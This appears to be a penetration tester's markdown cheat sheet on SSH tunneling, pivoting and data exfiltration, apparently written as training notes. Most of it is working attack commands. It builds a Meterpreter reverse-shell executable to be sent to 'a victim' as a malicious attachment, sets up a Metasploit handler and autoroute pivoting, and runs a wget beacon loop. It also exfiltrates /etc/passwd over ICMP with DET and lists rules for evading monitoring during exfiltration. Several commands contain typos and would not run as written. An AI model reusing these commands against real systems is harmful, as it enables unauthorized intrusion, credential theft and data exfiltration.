# Tunneling, Port Forwarding, Pivoting, & Exfiltration

## Tunneling

Where one protocol is used to carry traffic for another protocol.

### SSH Tunneling

#### 3 Types

1. Local port forwarding
2. Remote port forwarding
3. Dynamic port forwarding

#### Local Port Forwarding

If we look at our local Kali host `http://127.0.0.1:8080` nothing is currently running there.

Now use SSH to connect to my target server on port 80, but access it on port 8080 locally.

```bash
# From Kali
ssh -f -nNT -L 8080:localhost:80 target_user@target_IP
ssh -f -nNT -L 8080:localhost:80 msfadmin@10.0.2.8
```

Should now be able to navigate to `http://127.0.0.1:8080` and see the target's web page.

We can use `lsof` to kill it: `lsof -i` and kill the PID of the process.

#### Remote Port Forwarding

```bash
# From Target
sudo ssh -R 2222:localhost:22 kali@kali_IP
# From Kali
ssh target_IP -p 2222
```

#### Running HTTP through an SSH Tunnel

```bash
# From Target
sudo ssh -f -nNT -R 8080:localhost:80 msfadmin@10.0.2.8
# From Kali
# Can now navigate to 10.0.2.8 in a browser. Was not available prior.
```

#### Dynamic Port Forwarding

```bash
# From Kali
ssh -f - N -D 9050 kali@intermediate_IP  # Dual homed with second IP of 10.1.1.7
proxychains ssh 10.1.1.5  # Target IP
```

## Port Forwarding

Forwarding an incoming IP:port to an outoging IP:port.

## Pivoting

Technique used to burrow deep into a network by routing one machine to another.

### Armitage

```bash
# Setup Meterpreter revere shell
msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe LHOST=<IP> LPORT=<IP> -o winjan.exe
# From Armitage
# Add target host, select payload, windows, meterpreter, reverse_tcp, remove encoding, and update the port
# Now wait for a victim to click the malicious attachment winjan.exe
# Arimtage has detected and exploited it
# Right click on the target to select meterpreter, pivoting, setup, and see additional hosts
# We can now scan the new target(s). Select Hosts, MSFscans, and enter range
```

### Metasploit

```bash
msf > use exploit/multi/handler
msf > set payload windos/meterpreter/reverse_tcp
msf > set lhsot
msf > set lport
msf > exploit
# Now execute the winjan.exe file from the target like with Armitage
# We now have a meterpreter reverse shell and can check the network configuration
meterpreter > shell
C:\tools>ipconfig
exit
meterpreter > background
msf exploit(multi/handler) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set subnet 10.1.1.0
msf post(multi/manage/autoroute) > set session 1
msf post(multi/manage/autoroute) > exploit
# We can now pivot by scanning one of the new targets
msf auxiliary(scanner/ssh/ssh_version) > set rhosts 10.1.1.5
msf auxiliary(scanner/ssh/ssh_version) > exploit
```

## Exfiltration

Various ways to get information out of the network.

### Ten Commandments of Exfiltration

#### Five Assumptions of Exfiltration

1. Monitoring is perfect
2. Reputation is checked
3. Encryption stripping is in place
4. Monitoring and analysis is at a commercial level
5. Blind proactive countermeasures may affect exfiltration

#### Five Rules of Exfiltration

1. Do not use obfuscation
2. Use web protocols
3. Use innocuous techniques
4. Sending and receiving time is synchronized
5. Manual mechanisms can be used

### Beaconing

* A beacon is a malicious form of "heartbeat"
* Beacons may just indicate their existence
* Beacons may trigger tasking from the C\&C server
* Sophisticated beacons vary their calling schedule
* Beacons commonly use HTTP/HTTPS
* Use legitimate and innocuous traffic
* Sophisticated beacons may use multiple destinations

#### Example

```bash
while true; do wget -O /dev/null http://<URL>/; sleep 10; done;
```

There are other beacon simulators online such as on GitHub.

### PyExfil

[https://github.com/ytisf/PyExfil](https://github.com/ytisf/PyExfil)

Using PyExfil to exfiltrate over HTTPS

```bash
# Two terminals used
# Terminal 1 (Collector)
python https_server.py
# Terminal 2 (Target)
python https_client.py
```

### DET

[https://github.com/sensepost/DET](https://github.com/sensepost/DET)

```bash
# Two terminals used
# Terminal 1 (Collector - ICMP Server)
python det.py -c ./config-sample.json -p icmp -L
# Terminal 2 (Target - Exfiltrating data - ICMP Client)
python det.py -c ./config-sample.json -p icmp -f /etc/passwd
```

### Cachetalk

[https://github.com/SafeBreach-Labs/cachetalk](https://github.com/SafeBreach-Labs/cachetalk)

```bash
python covert.py -t http://<URL>/
# Two terminals used
# Terminal 1
python covert.py -w stuff http://<URL>/ 10 -s -1
# Terminal 2
python covert.py -r 10 http://<URL>/ 10 -s -1
```

### DNS Exfiltration

#### dnsteal

[https://github.com/m57/dnsteal](https://github.com/m57/dnsteal)

```bash
python dnsteal.py <IP> -z -v
# From target

```

### OpenPuff

[https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/](https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/)

Video exfiltration
